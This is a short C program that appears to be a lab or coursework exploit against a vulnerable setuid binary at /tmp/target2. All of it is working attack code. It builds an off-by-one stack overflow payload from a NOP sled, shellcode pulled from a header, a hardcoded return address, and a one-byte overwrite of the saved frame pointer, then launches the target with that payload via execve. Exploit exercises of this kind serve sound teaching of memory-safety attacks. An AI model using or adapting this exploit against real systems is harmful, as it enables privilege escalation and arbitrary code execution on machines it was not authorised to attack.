#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOP    0x90

int main(void)
{
  char *args[3];
  char *env[1];

  // calculate payload size
  int ofsize = 108 + 2;

  char payload[ofsize];
  int i;

  // Fill front of payload with NOPs
  for(i = 0; i < ofsize-strlen(shellcode)-4-2; i++) {
    payload[i] = NOP;
  }

   // Inject shellcode
  int j;
  for(j = 0, i=i; j < strlen(shellcode); i++, j++) {
    payload[i] = shellcode[j];
  } 

  // Insert address to shellcode into payload
  payload[i++] = 0x9B;
  payload[i++] = 0xFD;
  payload[i++] = 0xFF;
  payload[i++] = 0xBF;

  // Overflow by one byte and null-terminate the string
  payload[108] = 0xc4;
  payload[109] = 0x00;

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
